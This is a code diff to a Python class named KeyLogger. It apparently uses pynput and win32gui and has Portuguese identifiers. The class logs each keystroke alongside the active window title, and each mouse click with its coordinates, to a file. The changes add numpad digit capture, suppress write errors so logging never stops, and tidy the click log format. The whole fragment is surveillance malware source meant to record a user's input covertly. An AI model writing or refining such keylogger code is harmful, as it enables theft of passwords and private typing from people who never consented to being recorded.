@@ -22,7 +22,29 @@ class KeyLogger():
     @staticmethod
     def get_char(Tecla):
         try:
-            return Tecla.char
+            if Tecla.char != None:
+                return Tecla.char
+            else:
+                if str(Tecla) == '<96>':
+                    return '0'
+                if str(Tecla) == '<97>':
+                    return '1'
+                if str(Tecla) == '<98>':
+                    return '2'
+                if str(Tecla) == '<99>':
+                    return '3'
+                if str(Tecla) == '<100>':
+                    return '4'
+                if str(Tecla) == '<101>':
+                    return '5'
+                if str(Tecla) == '<102>':
+                    return '6'
+                if str(Tecla) == '<103>':
+                    return '7'
+                if str(Tecla) == '<104>':
+                    return '8'
+                if str(Tecla) == '<105>':
+                    return '9'
         except AttributeError:
             if str(Tecla) == 'Key.space':
                 Tecla = str(Tecla).replace('Key.space',' ')
@@ -33,12 +55,15 @@ class KeyLogger():
     def on_press(self, Tecla):
         with open(self.NomeDoArquivo, 'a') as logs:
             logs.write(self.get_win_name())
-            logs.write(self.get_char(Tecla))
+            try:
+                logs.write(self.get_char(Tecla))
+            except:
+                pass
 
     def on_click(self, x, y, botao, pressionado):
         if pressionado:
             with open(self.NomeDoArquivo, 'a') as logs:
-                logs.write('\nClick registrado em ({0}, {1}) usando {2}'.format(x, y, botao))
+                logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, botao))
             
     def get_win_name(self):
         janela = win32gui
